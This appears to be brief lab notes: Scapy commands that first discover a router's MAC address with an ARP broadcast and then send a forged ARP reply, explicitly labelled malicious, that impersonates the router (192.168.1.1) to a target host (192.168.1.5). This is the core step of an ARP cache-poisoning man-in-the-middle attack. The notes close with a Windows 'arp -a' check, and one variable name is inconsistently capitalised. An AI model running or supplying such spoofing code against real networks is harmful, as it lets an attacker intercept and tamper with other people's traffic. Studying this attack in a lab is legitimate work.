On Linux

scapy

ls(ARP)

# Part 1
# Create ARP request
broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
# Get router address = enter router IP
arppacket = ARP(pdst="192.168.1.1")
arppacket.show()

finalPacket = broadcast/arppacket
finalPacket.show()

# Send packet
answer = srp(finalPacket, timeout=2, verbose=True)[0]

# Print answer
mac_address = answer[0][1].hwsrc
print(mac_address)

# Show own MAC
mac_address

# Part 2
# Create malicious ARP packet to target IP
finalpacket.pdst = "192.168.1.5"
answer = srp(finalPacket, timeout=2, verbose=False)[0]
answer
mac = answer[0][1].hwsrc
print(mac)

# MAC address of target and IP and psrc = router IP
packet = ARP(op=2, hwdst="xx:xx:xx:xx:xx:xx", pdst="192.168.1.5", psrc="192.168.1.1")
send(packet, verbose=False)

# On Windows
arp -a
